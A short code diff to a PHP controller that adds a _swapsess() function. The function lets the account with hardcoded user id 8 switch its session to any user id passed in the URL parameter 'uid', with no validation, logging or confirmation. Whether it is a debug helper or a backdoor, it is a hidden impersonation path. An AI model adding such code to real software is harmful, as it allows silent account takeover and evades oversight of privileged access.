@@ -109,6 +109,14 @@ class appController extends Axis_Controller
         }
 
 
+        function _swapsess()
+        {
+                if (user('id') == 8) {
+                        setSession($_GET['uid']);
+                }
+        }
+
+
         function _logout()
         {
         	killSession();
